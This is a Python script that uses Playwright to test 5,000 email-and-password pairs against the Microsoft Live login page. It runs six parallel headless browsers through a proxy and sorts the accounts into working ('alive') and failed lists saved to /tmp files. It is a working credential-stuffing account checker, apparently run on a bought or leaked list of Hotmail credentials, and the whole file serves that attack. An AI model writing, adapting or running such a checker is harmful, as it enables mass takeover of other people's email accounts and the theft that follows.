#!/usr/bin/env python3
"""Check 5000 hotmail - multi worker (6 workers, no proxy)"""
import sys, os, time, json
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from playwright.sync_api import sync_playwright

INPUT = '/home/long/.openclaw/media/inbound/5000_mail_trust---3a2de585-be8f-4d1c-a6a9-8ecb6cd6d417.txt'
ALIVE_LOG = '/tmp/hotmail_alive_5000.txt'
DEAD_LOG = '/tmp/hotmail_dead_5000.txt'
WORKERS = 6

with open(INPUT) as f:
    accounts = []
    for l in f:
        l = l.strip()
        if '|' in l:
            p = l.split('|', 1)
            if '@' in p[0]:
                accounts.append((p[0].strip(), p[1].strip()))

total = len(accounts)
print(f'Total: {total}, Workers: {WORKERS}')
start_time = time.time()

# Shared state
results_lock = Lock()
alive_all = []
dead_all = []
processed = 0
start_time_val = time.time()

def worker(chunk, wid):
    global processed, start_time_val
    local_alive = []
    local_dead = []
    
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage',
                      '--proxy-pac-url=http://ip.mproxy.vn/12313.pac']
            )
            
            for email, password in chunk:
                t0 = time.time()
                ctx = None
                try:
                    ctx = browser.new_context(
                        user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36',
                        locale='en-US'
                    )
                    page = ctx.new_page()
                    page.goto('https://login.live.com/', timeout=25000)
                    time.sleep(1.5)
                    
                    page.wait_for_selector('input[type="email"]', timeout=10000)
                    page.locator('input[type="email"]').fill(email)
                    page.locator('button:has-text("Next")').click()
                    time.sleep(1.5)
                    
                    if page.locator('input[type="password"]').count() > 0:
                        page.locator('input[type="password"]').fill(password)
                        page.keyboard.press('Enter')
                    elif page.locator('text=Use your password').count() > 0:
                        page.locator('text=Use your password').click()
                        time.sleep(1.5)
                        page.locator('input[type="password"]').fill(password)
                        page.keyboard.press('Enter')
                    else:
                        local_dead.append(f'{email}|{password}|rejected')
                        ctx.close()
                        with results_lock:
                            processed += 1
                        continue
                    
                    time.sleep(3)
                    body = page.evaluate('document.body.innerText')[:200]
                    url = page.url
                    ctx.close()
                    
                    if 'Stay signed in' in body or 'outlook' in url or 'A quick note' in body:
                        local_alive.append(f'{email}|{password}')
                    elif 'incorrect' in body.lower() or 'wrong password' in body.lower():
                        local_dead.append(f'{email}|{password}|wrong_pw')
                    elif 'verify' in body.lower() or 'approve' in body.lower():
                        local_dead.append(f'{email}|{password}|verify')
                    elif 'locked' in body.lower():
                        local_dead.append(f'{email}|{password}|locked')
                    else:
                        local_dead.append(f'{email}|{password}|unknown')
                    
                except Exception as e:
                    if ctx: 
                        try: ctx.close()
                        except: pass
                    local_dead.append(f'{email}|{password}|error:{type(e).__name__}')
                
                with results_lock:
                    processed += 1
                    p = processed
                
                if p == 1 or p % 25 == 0:
                    elapsed = time.time() - start_time_val
                    rate = p / (elapsed / 60) if elapsed > 0 else 0
                    eta = (total - p) / rate if rate > 0 else 999
                    print(f'[W{wid}] {p}/{total} | {rate:.0f}/min | ETA {eta:.0f}min | alive={len(local_alive)}')
                    sys.stdout.flush()
                    with open('/tmp/check5000_progress.json', 'w') as f:
                        json.dump({'processed': p, 'total': total, 'rate': rate, 'eta': eta}, f)
            
            browser.close()
    except Exception as e:
        print(f'[W{wid}] FATAL: {e}')
    
    return local_alive, local_dead

# Split accounts
chunk_size = len(accounts) // WORKERS + 1
chunks = [accounts[i:i+chunk_size] for i in range(0, len(accounts), chunk_size)]

all_a, all_d = [], []
with ThreadPoolExecutor(max_workers=WORKERS) as ex:
    futures = [ex.submit(worker, ch, i) for i, ch in enumerate(chunks)]
    for f in as_completed(futures):
        a, d = f.result()
        all_a.extend(a)
        all_d.extend(d)

# Save
with open(ALIVE_LOG, 'w') as f:
    f.write('\n'.join(all_a) + '\n')
with open(DEAD_LOG, 'w') as f:
    f.write('\n'.join(all_d) + '\n')

elapsed = time.time() - start_time
print(f'\n{"="*50}')
print(f'  DONE! {elapsed/60:.1f} minutes')
print(f'  Alive: {len(all_a)}/{total} ({len(all_a)/total*100:.1f}%)')
print(f'  Dead:  {len(all_d)}/{total}')
print(f'  Rate:  {total/(elapsed/60):.0f}/minute')
print(f'  Alive: {ALIVE_LOG}')
print(f'  Dead:  {DEAD_LOG}')
print(f'{"="*50}')
if all_a:
    print(f'First 10 alive:')
    for a in all_a[:10]:
        print(f'  ✅ {a.split("|")[0]}')
